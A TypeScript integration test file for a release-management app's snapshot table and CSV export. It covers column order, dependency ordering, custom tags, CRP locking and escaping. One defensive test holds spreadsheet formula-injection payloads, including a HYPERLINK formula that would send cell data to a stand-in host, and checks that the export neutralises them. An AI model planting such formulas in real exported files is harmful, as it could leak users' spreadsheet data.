/**
 * 提测详情（A13）与快照表导出的集成测试：真连数据库跑一遍。
 *
 * 锁住的是这几条硬约束：
 *
 * - 快照表 11 列，列名与顺序固定（MUST：缺列即不合格，AC1）；
 * - 提交顺序是依赖拓扑序（上游在前），不是插入顺序，也不是姓氏顺序；
 * - 「是否使用自定义 Tag」按 `releaseVersion !== codeVersion` 判定，是推导值不是存储字段；
 * - 「基线 Commit」取同一个包在这条提测里上一轮的 Commit，首轮为空；
 * - 未登记的软件包显示包名、仓库路径留空，不影响其余行；
 * - 提交说明 / 提交人读不到 Gerrit 时留空并给出原因，其余数据照常返回；
 * - 已转测（`WorkProgress >= 20`）时「更新提测」被锁并给出原因（AC5）；
 * - CSV 的表头与快照表同源、行数与软件包数一致（AC3）。
 */

import "dotenv/config";

import assert from "node:assert/strict";
import test, { after, before } from "node:test";

import { GET as exportRoute } from "../app/api/releases/[id]/export/route";
import { prisma } from "../lib/db";
import { GerritError } from "../lib/integrations/gerrit";
import {
  buildSnapshotCsv,
  crpTopicUrl,
  loadReleaseDetail,
  loadReleaseUpdateView,
  SNAPSHOT_COLUMNS,
  snapshotRowCells,
  type ReleaseDetailPackage,
} from "../lib/releases";

const PREFIX = "zz887d";
const WORKSPACE_SLUG = `${PREFIX}-workspace`;
const MANAGER_NAME = `${PREFIX}-manager`;
const PROJECT_KEY = `${PREFIX}-proj`;
const RELEASE_VERSION = `${PREFIX}-2.0.0`;
const CRP_TOPIC_ID = "998802";
const CRP_BASE = "https://crp.test/api";

const SHA_A_OLD = "a".repeat(39) + "1";
const SHA_A = "a".repeat(39) + "2";
const SHA_B = "b".repeat(40);
const SHA_C = "c".repeat(40);
const SHA_D = "d".repeat(40);

const T1 = new Date("2026-11-19T02:00:00Z");
const T2 = new Date("2026-11-19T03:00:00Z");
const T3 = new Date("2026-11-19T04:00:00Z");

type Fixture = {
  workspaceId: string;
  releaseId: string;
  projectId: string;
};

let fixture: Fixture;

function pkgName(suffix: string): string {
  return `${PREFIX}-${suffix}`;
}

/** 假的提交信息读取：`b` 读不到，用来验证「一个包读不到不影响其余行」。 */
const readCommitInfo = async (repoPath: string, commitSha: string) => {
  if (repoPath.endsWith("/b")) {
    throw new GerritError("Gerrit 暂时读不到这条提交。");
  }

  return { summary: `提交说明 ${commitSha.slice(-1)}`, authorName: `作者 ${commitSha.slice(-1)}` };
};

/** 假的 CRP：只回答工作流进度，够锁定的判定用。 */
function crpFetchOf(workProgress: number): typeof fetch {
  return (async (input: RequestInfo | URL) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    const path = new URL(url).pathname.replace(/^\/api/, "");
    const workflow = /^\/topics\/\d+\/workflow\/info$/.exec(path);

    if (workflow === null) {
      return new Response(JSON.stringify({ message: "unexpected" }), { status: 500 });
    }

    return new Response(
      JSON.stringify({ TopicID: Number(CRP_TOPIC_ID), WorkProgress: workProgress }),
      { status: 200, headers: { "content-type": "application/json" } },
    );
  }) as typeof fetch;
}

function networkOf(workProgress: number) {
  return {
    crpBaseUrl: CRP_BASE,
    crpToken: "injected-token",
    crpFetch: crpFetchOf(workProgress),
  };
}

async function cleanup(): Promise<void> {
  const workspaces = await prisma.workspace.findMany({
    where: { slug: WORKSPACE_SLUG },
    select: { id: true },
  });
  const workspaceIds = workspaces.map((item) => item.id);

  const projects = await prisma.project.findMany({
    where: { workspaceId: { in: workspaceIds } },
    select: { id: true },
  });
  const projectIds = projects.map((item) => item.id);

  const releases = await prisma.release.findMany({
    where: { projectId: { in: projectIds } },
    select: { id: true },
  });
  const releaseIds = releases.map((item) => item.id);

  await prisma.releaseUpdateRecord.deleteMany({ where: { releaseId: { in: releaseIds } } });
  await prisma.crpCallLog.deleteMany({ where: { releaseId: { in: releaseIds } } });
  await prisma.releaseRepositoryRecord.deleteMany({ where: { releaseId: { in: releaseIds } } });
  // 替换关系是自引用外键，先解开再删。
  await prisma.releasePackageSnapshot.updateMany({
    where: { releaseId: { in: releaseIds } },
    data: { supersededById: null },
  });
  await prisma.releasePackageSnapshot.deleteMany({ where: { releaseId: { in: releaseIds } } });
  await prisma.release.deleteMany({ where: { id: { in: releaseIds } } });

  await prisma.projectSoftware.deleteMany({ where: { projectId: { in: projectIds } } });
  await prisma.project.deleteMany({ where: { id: { in: projectIds } } });
  await prisma.projectManager.deleteMany({ where: { workspace: { id: { in: workspaceIds } } } });
  await prisma.membership.deleteMany({ where: { workspaceId: { in: workspaceIds } } });
  await prisma.workspace.deleteMany({ where: { id: { in: workspaceIds } } });
  await prisma.baseline.deleteMany({ where: { crpBranchId: { startsWith: PREFIX } } });

  await prisma.packageDependency.deleteMany({
    where: {
      OR: [
        { package: { name: { startsWith: PREFIX } } },
        { upstreamPackage: { name: { startsWith: PREFIX } } },
      ],
    },
  });
  await prisma.package.deleteMany({ where: { name: { startsWith: PREFIX } } });
  await prisma.user.deleteMany({ where: { email: { startsWith: PREFIX } } });
}

before(async () => {
  await cleanup();

  const workspace = await prisma.workspace.create({
    data: { slug: WORKSPACE_SLUG, name: `${PREFIX} 工作区` },
    select: { id: true },
  });
  const user = await prisma.user.create({
    data: {
      email: `${PREFIX}@example.com`,
      passwordHash: "not-a-real-hash",
      displayName: `${PREFIX} 开发者`,
    },
    select: { id: true },
  });
  await prisma.membership.create({
    data: { workspaceId: workspace.id, userId: user.id, role: "developer" },
  });

  const baseline = await prisma.baseline.create({
    data: { crpBranchId: `${PREFIX}-branch`, name: `${PREFIX}-baseline` },
    select: { id: true },
  });
  const manager = await prisma.projectManager.create({
    data: { workspaceId: workspace.id, name: MANAGER_NAME },
    select: { id: true },
  });
  const project = await prisma.project.create({
    data: {
      workspaceId: workspace.id,
      projectManagerId: manager.id,
      baselineId: baseline.id,
      key: PROJECT_KEY,
      name: `${PREFIX} 项目`,
    },
    select: { id: true },
  });

  // 登记的三个包：b 依赖 a，c 依赖 b；d 故意不登记，验证「未登记的包显示包名」。
  const packageIds: Record<string, string> = {};
  for (const suffix of ["a", "b", "c"]) {
    const created = await prisma.package.create({
      data: { name: pkgName(suffix), repoPath: `${PREFIX}/${suffix}`, defaultBranch: "develop/eagle" },
      select: { id: true },
    });
    packageIds[suffix] = created.id;
  }
  await prisma.packageDependency.create({
    data: { packageId: packageIds.b as string, upstreamPackageId: packageIds.a as string },
  });
  await prisma.packageDependency.create({
    data: { packageId: packageIds.c as string, upstreamPackageId: packageIds.b as string },
  });

  const release = await prisma.release.create({
    data: {
      projectId: project.id,
      version: RELEASE_VERSION,
      revision: 2,
      status: "building",
      source: "imported",
      description: `${PREFIX} 提测说明`,
      createdById: user.id,
      crpTopicId: CRP_TOPIC_ID,
      crpBranchId: `${PREFIX}-branch`,
      crpTopicState: 1,
      crpTopicAbandoned: false,
      crpTopicCompleted: false,
      crpWorkProgress: 0,
      crpWorkProgressLabel: "未开始",
      crpWorkProgressSyncedAt: T3,
    },
    select: { id: true },
  });

  // a 的第一轮被第二轮替换；其余包只有一轮。
  const aOld = await prisma.releasePackageSnapshot.create({
    data: {
      releaseId: release.id,
      packageName: pkgName("a"),
      attempt: 1,
      branch: "develop/eagle",
      commitSha: SHA_A_OLD,
      codeVersion: "1.0.0-0",
      repoVersion: "0.9.0-1",
      releaseVersion: "1.0.0",
      status: "superseded",
    },
    select: { id: true },
  });
  const aNew = await prisma.releasePackageSnapshot.create({
    data: {
      releaseId: release.id,
      packageName: pkgName("a"),
      attempt: 2,
      branch: "develop/eagle",
      commitSha: SHA_A,
      codeVersion: "1.0.0-1",
      repoVersion: "0.9.0-1",
      releaseVersion: "1.0.0-1",
    },
    select: { id: true },
  });
  await prisma.releasePackageSnapshot.update({
    where: { id: aOld.id },
    data: { supersededById: aNew.id, supersededAt: T1 },
  });

  const bRow = await prisma.releasePackageSnapshot.create({
    data: {
      releaseId: release.id,
      packageName: pkgName("b"),
      attempt: 1,
      branch: "develop/eagle",
      commitSha: SHA_B,
      // 提测版本与代码版本不同：填过自定义 Tag。
      codeVersion: "2.0.0-1",
      releaseVersion: "9.9.9",
    },
    select: { id: true },
  });
  await prisma.releasePackageSnapshot.create({
    data: {
      releaseId: release.id,
      packageName: pkgName("c"),
      attempt: 1,
      branch: "develop/eagle",
      commitSha: SHA_C,
      codeVersion: "3.0.0-1",
      releaseVersion: "3.0.0",
    },
  });
  await prisma.releasePackageSnapshot.create({
    data: {
      releaseId: release.id,
      packageName: pkgName("d"),
      attempt: 1,
      branch: "develop/eagle",
      commitSha: SHA_D,
      codeVersion: "4.0.0-1",
      releaseVersion: "4.0.0",
    },
  });

  await prisma.releaseRepositoryRecord.create({
    data: {
      releaseId: release.id,
      snapshotId: bRow.id,
      crpReleaseId: "50002",
      crpBuildId: "90002",
      crpReleaseState: 2,
      crpStatusName: "构建中",
      repositoryUrl: "https://crp.test/repo/pool/main/b/",
      lastSyncedAt: T2,
    },
  });
  await prisma.releaseRepositoryRecord.create({
    data: {
      releaseId: release.id,
      snapshotId: aNew.id,
      crpReleaseId: "50001",
      crpBuildId: "90001",
      crpReleaseState: 3,
      crpStatusName: "构建成功",
      // 夹具：CRP 记的 Tag 与我们提交的值不同（末位数字加一，真实形态见 FINDINGS.md 6.1）。
      crpTag: "1.0.0-2",
      crpBaseTag: "1.0.0-1",
      repositoryUrl: "https://crp.test/repo/pool/main/a/",
      lastSyncedAt: T1,
    },
  });

  await prisma.releaseUpdateRecord.create({
    data: {
      releaseId: release.id,
      operatorId: user.id,
      action: "append",
      packageNames: [pkgName("d")],
      revisionBefore: 1,
      revisionAfter: 2,
      abandonedCrpReleaseIds: ["50002"],
      redispatchedPackageNames: [pkgName("d")],
      createdAt: T3,
    },
  });

  fixture = { workspaceId: workspace.id, releaseId: release.id, projectId: project.id };
});

after(async () => {
  await cleanup();
  await prisma.$disconnect();
});

test("快照表固定 11 列，列名与顺序与 PRD 一致（AC1）", () => {
  assert.equal(SNAPSHOT_COLUMNS.length, 11);
  assert.deepEqual([...SNAPSHOT_COLUMNS], [
    "提交顺序",
    "软件包/仓库",
    "分支",
    "代码版本",
    "基线仓库版本",
    "本次提测版本",
    "是否自定义 Tag",
    "基线 Commit",
    "本次 Commit",
    "提交说明",
    "提交人",
  ]);
});

test("提交顺序是依赖拓扑序，上游在前", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });

  assert.deepEqual(
    detail.packages.map((item) => item.packageName),
    [pkgName("a"), pkgName("b"), pkgName("c"), pkgName("d")],
  );
  assert.equal(detail.packages.length, 4);
});

test("每行铺满 11 个格子，第一个格子是提交顺序", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });

  detail.packages.forEach((item, index) => {
    const cells = snapshotRowCells(item, index + 1);

    assert.equal(cells.length, SNAPSHOT_COLUMNS.length);
    assert.equal(cells[0], String(index + 1));
  });

  const first = snapshotRowCells(detail.packages[0] as ReleaseDetailPackage, 1);

  assert.equal(first[1], `${pkgName("a")}（${PREFIX}/a）`);
  assert.equal(first[2], "develop/eagle");
  assert.equal(first[3], "1.0.0-1");
  assert.equal(first[4], "0.9.0-1");
  assert.equal(first[5], "1.0.0-1");
  assert.equal(first[6], "否");
  assert.equal(first[7], SHA_A_OLD);
  assert.equal(first[8], SHA_A);
});

test("自定义 Tag 用独立文字标识，不靠颜色；按提测版本与代码版本不等判定", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });
  const b = detail.packages.find((item) => item.packageName === pkgName("b"));

  assert.equal(b?.customTag, true);
  assert.equal(snapshotRowCells(b as ReleaseDetailPackage, 2)[6], "是（自定义 Tag）");

  const a = detail.packages.find((item) => item.packageName === pkgName("a"));

  assert.equal(a?.customTag, false);
});

test("基线 Commit 取同一个包上一轮的 Commit，首轮为空", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });
  const byName = new Map(detail.packages.map((item) => [item.packageName, item]));

  assert.equal(byName.get(pkgName("a"))?.baselineCommit, SHA_A_OLD);
  assert.equal(byName.get(pkgName("a"))?.attempt, 2);
  assert.equal(byName.get(pkgName("b"))?.baselineCommit, null);
});

test("未登记的软件包显示包名，仓库路径留空并说明原因", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });
  const d = detail.packages.find((item) => item.packageName === pkgName("d"));

  assert.equal(d?.repoPath, null);
  assert.equal(snapshotRowCells(d as ReleaseDetailPackage, 4)[1], pkgName("d"));
  assert.match(d?.commitError ?? "", /仓库路径/);
});

test("提交说明与提交人取自 Commit；一个包读不到不影响其余行", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });
  const byName = new Map(detail.packages.map((item) => [item.packageName, item]));

  assert.equal(byName.get(pkgName("a"))?.commitMessage, `提交说明 ${SHA_A.slice(-1)}`);
  assert.equal(byName.get(pkgName("a"))?.commitAuthor, `作者 ${SHA_A.slice(-1)}`);
  assert.equal(byName.get(pkgName("a"))?.commitError, null);

  // b 的读取抛错：两列留空，原因写在 commitError 上，模型照样返回。
  assert.equal(byName.get(pkgName("b"))?.commitMessage, null);
  assert.equal(byName.get(pkgName("b"))?.commitAuthor, null);
  assert.match(byName.get(pkgName("b"))?.commitError ?? "", /读不到/);

  // c 没受影响。
  assert.equal(byName.get(pkgName("c"))?.commitMessage, `提交说明 ${SHA_C.slice(-1)}`);
});

test("来源为导入时给出原 CRP Topic 地址", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, {
    readCommitInfo,
    crpBaseUrl: CRP_BASE,
  });

  assert.equal(detail.source, "imported");
  assert.equal(detail.crpTopicId, CRP_TOPIC_ID);
  assert.equal(detail.crpTopicUrl, `https://crp.test/#/detail/detail?id=${CRP_TOPIC_ID}`);
  assert.equal(crpTopicUrl(null, CRP_BASE), null);
});

test("更新历史按包名说清放弃了哪些包、加了哪些包", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });
  const [row] = detail.history;

  assert.equal(row?.action, "append");
  assert.deepEqual(row?.packageNames, [pkgName("d")]);
  assert.deepEqual(row?.abandonedPackages, [pkgName("b")]);
  assert.deepEqual(row?.redispatchedPackageNames, [pkgName("d")]);
  assert.equal(row?.revisionBefore, 1);
  assert.equal(row?.revisionAfter, 2);
  assert.equal(row?.operatorName, `${PREFIX} 开发者`);
});

test("CRP 仓库记录按包名排出确定顺序，与插入顺序无关", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });

  assert.equal(detail.repositoryRecords.length, 2);
  // 两条记录是倒着插的（b 先、a 后）：查询不带 orderBy 时这里会反过来，
  // 整页截图就会因为行序变化随机失败。
  assert.deepEqual(
    detail.repositoryRecords.map((row) => row.packageName),
    [pkgName("a"), pkgName("b")],
  );
  assert.equal(detail.repositorySyncedAt?.toISOString(), T2.toISOString());

});

test("AC2 CRP 侧的实际 Tag 与 BaseTag 出现在仓库记录里，快照的提测版本不改写", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });

  const recordA = detail.repositoryRecords.find((row) => row.packageName === pkgName("a"));
  assert.ok(recordA !== undefined);
  assert.equal(recordA.crpTag, "1.0.0-2");
  assert.equal(recordA.crpBaseTag, "1.0.0-1");

  // 快照里的「本次提测版本」是我们提交的值：CRP 记的那份只出现在仓库记录那一列。
  const packageA = detail.packages.find((item) => item.packageName === pkgName("a"));
  assert.ok(packageA !== undefined);
  assert.equal(packageA.releaseVersion, "1.0.0-1");

  // 没同步过 Tag 的记录留空，页面显示破折号，不跟着编一个值出来。
  const recordB = detail.repositoryRecords.find((row) => row.packageName === pkgName("b"));
  assert.ok(recordB !== undefined);
  assert.equal(recordB.crpTag, null);
  assert.equal(recordB.crpBaseTag, null);
});

test("已转测（WorkProgress >= 20）时「更新提测」被锁并给出原因（AC5）", async () => {
  const locked = await loadReleaseDetail(fixture.releaseId, {
    readCommitInfo,
    network: networkOf(20),
  });

  assert.match(locked.lockReason ?? "", /已经转测/);
  assert.match(locked.lockReason ?? "", /20/);

  const open = await loadReleaseDetail(fixture.releaseId, {
    readCommitInfo,
    network: networkOf(0),
  });

  assert.equal(open.lockReason, null);
});

test("详情页与更新页读的是同一份锁定结论", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, {
    readCommitInfo,
    network: networkOf(20),
  });
  const updateView = await loadReleaseUpdateView(fixture.releaseId, {
    network: networkOf(20),
  });

  assert.equal(detail.lockReason, updateView.lockReason);
  assert.equal(detail.history.length, updateView.history.length);
});

test("CSV 表头与快照表同源，行数与软件包数一致（AC3）", async () => {
  const detail = await loadReleaseDetail(fixture.releaseId, { readCommitInfo });
  const csv = buildSnapshotCsv(detail.packages);
  const lines = csv.replace(/^\uFEFF/, "").trimEnd().split("\r\n");

  assert.ok(csv.startsWith("\uFEFF"), "带 BOM，Excel 打开中文不乱码");
  assert.equal(lines[0], SNAPSHOT_COLUMNS.join(","));
  assert.equal(lines.length, detail.packages.length + 1);
  assert.ok(lines.slice(1).every((line) => line.split(",").length === 11));
});

test("CSV 挡住公式注入：以 = + - @ 开头的值加前导单引号", () => {
  const base: ReleaseDetailPackage = {
    packageName: `${PREFIX}-inject`,
    repoPath: null,
    attempt: 1,
    branch: "develop/eagle",
    codeVersion: "1.0.0-1",
    repoVersion: null,
    releaseVersion: "1.0.0",
    customTag: false,
    baselineCommit: null,
    commitSha: SHA_A,
    commitMessage: "普通提交说明",
    commitAuthor: "张三",
    commitError: null,
  };

  function rowOf(patch: Partial<ReleaseDetailPackage>): string {
    const csv = buildSnapshotCsv([{ ...base, ...patch }]);

    return csv.replace(/^\uFEFF/, "").trimEnd().split("\r\n")[1] ?? "";
  }

  // 提交说明整格是一段公式：单引号前缀 + RFC 4180 的引号转义（内部引号翻倍）。
  assert.match(
    rowOf({ commitMessage: '=HYPERLINK("http://example.invalid?"&A1,"x")' }),
    /"'=HYPERLINK\(""http:\/\/example\.invalid\?""&A1,""x""\)"/,
  );

  // 提测版本可以是任意自定义 Tag，同样要挡。
  assert.ok(rowOf({ releaseVersion: "=1+1" }).includes(",'=1+1,"));

  // 提交人原样来自 Gerrit，同样要挡。
  assert.ok(rowOf({ commitAuthor: "@SUM(A1:A2)" }).endsWith(",'@SUM(A1:A2)"));

  // ASCII 的减号要挡；占位符「—」（U+2014）不是减号，保持原样。
  assert.ok(rowOf({ commitMessage: "-被当成公式" }).includes(",'-被当成公式,"));
  assert.ok(rowOf({ commitMessage: "—" }).includes(",—,"));

  // 普通值不加前缀。
  assert.ok(rowOf({}).includes(",普通提交说明,"));
});

test("CSV 转义逗号与引号，不把一行拆成两行", () => {
  const tricky: ReleaseDetailPackage = {
    packageName: `${PREFIX}-tricky`,
    repoPath: null,
    attempt: 1,
    branch: "develop/eagle",
    codeVersion: "1.0.0-1",
    repoVersion: null,
    releaseVersion: "1.0.0",
    customTag: false,
    baselineCommit: null,
    commitSha: SHA_A,
    commitMessage: '修一个问题, 顺手带上 "引号"',
    commitAuthor: "张三",
    commitError: null,
  };
  const lines = buildSnapshotCsv([tricky]).replace(/^\uFEFF/, "").trimEnd().split("\r\n");

  assert.equal(lines.length, 2);
  assert.match(lines[1] ?? "", /"修一个问题, 顺手带上 ""引号"""/);
});

test("导出一条不存在的提测返回 404，不泄露它是否存在", async () => {
  const response = await exportRoute(
    new Request("http://localhost/api/releases/not-a-release/export"),
    { params: Promise.resolve({ id: "01a1ee26-0000-0000-0000-000000000000" }) },
  );

  assert.equal(response.status, 404);
  const body = (await response.json()) as { error: { code: string } };
  assert.equal(body.error.code, "release_not_found");
  assert.equal(response.headers.get("content-disposition"), null);
});
